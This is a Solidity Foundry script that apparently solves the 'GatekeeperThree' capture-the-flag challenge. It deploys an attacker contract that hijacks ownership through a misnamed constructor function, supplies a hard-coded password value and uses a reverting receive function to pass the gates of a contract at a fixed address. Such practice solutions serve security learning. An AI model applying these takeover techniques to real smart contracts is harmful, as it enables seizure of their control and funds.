// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";
import "forge-std/Script.sol";

contract Ex {
    GatekeeperThree public gkt_ = GatekeeperThree(payable(0xf28A40c7631dd62f68Abe745672426396D79Ac3f));

    function ex() public {
        gkt_.construct0r();
        gkt_.getAllowance(uint256(0x00000000000000000000000000000000000000000000000000000000696f3c48));
        gkt_.enter();
    }

    receive() external payable {
        revert();
    }
}

contract GateKeeperThreeSol is Script {
    GatekeeperThree public gkt_ = GatekeeperThree(payable(0xf28A40c7631dd62f68Abe745672426396D79Ac3f));

    function run() external {
        vm.startBroadcast();

        payable(gkt_).send(0.002 ether);
        Ex ex = new Ex();
        ex.ex();
        console.log(gkt_.entrant());

        vm.stopBroadcast();
    }
}

// function run() external {
//     vm.startBroadcast();

//     gkt_.createTrick();
//     console.log(address(gkt_.trick()));

//     vm.stopBroadcast();
// }